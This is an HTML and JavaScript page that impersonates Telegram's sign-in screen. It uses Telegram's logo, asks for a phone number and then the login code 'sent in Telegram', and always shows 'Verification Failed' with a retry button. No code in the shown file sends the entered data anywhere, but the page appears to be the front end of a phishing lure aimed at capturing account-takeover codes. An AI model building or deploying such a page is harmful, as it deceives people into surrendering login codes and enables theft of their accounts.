<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #1c1c1c;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow-x: hidden;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 380px;
            margin-top: -20px;
            position: relative;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 20px;
            color: #ffffff;
            margin-bottom: 10px;
            font-weight: 600;
        }

        p {
            font-size: 14px;
            color: #999999;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 12px;
            color: #999999;
            margin-bottom: 5px;
        }

        select, input[type="tel"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #555;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
            background-color: #1c1c1c;
            color: #ffffff;
        }

        select {
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            position: relative;
        }

        .dropdown-container {
            position: relative;
        }

        .dropdown {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid #555;
            padding: 10px;
            border-radius: 5px;
            background-color: #1c1c1c;
            color: #ffffff;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
        }

        .dropdown img {
            margin-right: 10px;
            width: 24px;
        }

        .dropdown::after {
            content: '‚ñº';
            font-size: 16px;
            color: #ffffff;
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background-color: #333333;
            border: 1px solid #555;
            border-radius: 5px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 1000;
        }

        .dropdown-menu.show {
            display: block;
        }

        .dropdown-item {
            padding: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            color: #ffffff;
        }

        .dropdown-item img {
            margin-right: 10px;
            width: 24px;
        }

        .dropdown-item:hover {
            background-color: #444444;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #6d5dfc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            font-weight: 600;
        }

        .button:hover {
            background-color: #5b4ddb;
        }

        @media (max-width: 600px) {
            .container {
                width: 95%;
                max-width: 340px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group dropdown-container">
            <label for="countryCode">Country</label>
            <div id="countryCode" class="dropdown" onclick="toggleDropdown()">
                <img src="https://www.countryflags.io/au/flat/24.png" alt="Flag"> Australia (+61)
            </div>
            <div id="dropdownMenu" class="dropdown-menu"></div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="tel" id="phoneNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn">
            <label for="keepSignedIn" style="color: #ffffff;">Keep me signed in</label>
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer" style="display:none;">
        <div class="monkey-icon">üêµ</div>
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer" style="display:none;">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryDropdown = document.getElementById('countryCode');
            const dropdownMenu = document.getElementById('dropdownMenu');
            const countries = [
                { name: 'Australia', code: '+61', flag: 'https://www.countryflags.io/au/flat/24.png' },
                { name: 'United States', code: '+1', flag: 'https://www.countryflags.io/us/flat/24.png' },
                { name: 'United Kingdom', code: '+44', flag: 'https://www.countryflags.io/gb/flat/24.png' },
                { name: 'Germany', code: '+49', flag: 'https://www.countryflags.io/de/flat/24.png' },
                { name: 'France', code: '+33', flag: 'https://www.countryflags.io/fr/flat/24.png' },
                { name: 'Japan', code: '+81', flag: 'https://www.countryflags.io/jp/flat/24.png' },
                { name: 'India', code: '+91', flag: 'https://www.countryflags.io/in/flat/24.png' },
                { name: 'China', code: '+86', flag: 'https://www.countryflags.io/cn/flat/24.png' },
                { name: 'Russia', code: '+7', flag: 'https://www.countryflags.io/ru/flat/24.png' },
                { name: 'South Korea', code: '+82', flag: 'https://www.countryflags.io/kr/flat/24.png' }
                // Add more countries as needed
            ];

            countries.forEach(country => {
                const item = document.createElement('div');
                item.classList.add('dropdown-item');
                item.innerHTML = `<img src="${country.flag}" alt="Flag"> ${country.name} ${country.code}`;
                item.dataset.code = country.code;
                item.addEventListener('click', function() {
                    countryDropdown.innerHTML = `<img src="${country.flag}" alt="Flag"> ${country.name} ${country.code}`;
                    document.getElementById('phoneNumber').value = country.code + ' ' + document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
                    dropdownMenu.classList.remove('show');
                });
                dropdownMenu.appendChild(item);
            });

            window.toggleDropdown = function() {
                dropdownMenu.classList.toggle('show');
            };

            window.goToVerificationPage = function() {
                const phoneNumber = document.getElementById('phoneNumber').value;
                if (phoneNumber === '') {
                    alert('Please enter your phone number.');
                    return;
                }

                document.getElementById('phoneDisplay').textContent = phoneNumber;
                document.getElementById('initialContainer').style.display = 'none';
                document.getElementById('verificationContainer').style.display = 'block';
            };

            window.submitVerification = function() {
                const verificationCode = document.getElementById('verificationCode').value;
                if (verificationCode === '') {
                    alert('Please enter the verification code.');
                    return;
                }

                document.getElementById('verificationContainer').style.display = 'none';
                document.getElementById('finalMessageContainer').style.display = 'block';
            };

            window.resetForm = function() {
                document.getElementById('phoneNumber').value = '';
                document.getElementById('verificationCode').value = '';
                document.getElementById('finalMessageContainer').style.display = 'none';
                document.getElementById('initialContainer').style.display = 'block';
            };
        });
    </script>
</body>
</html>
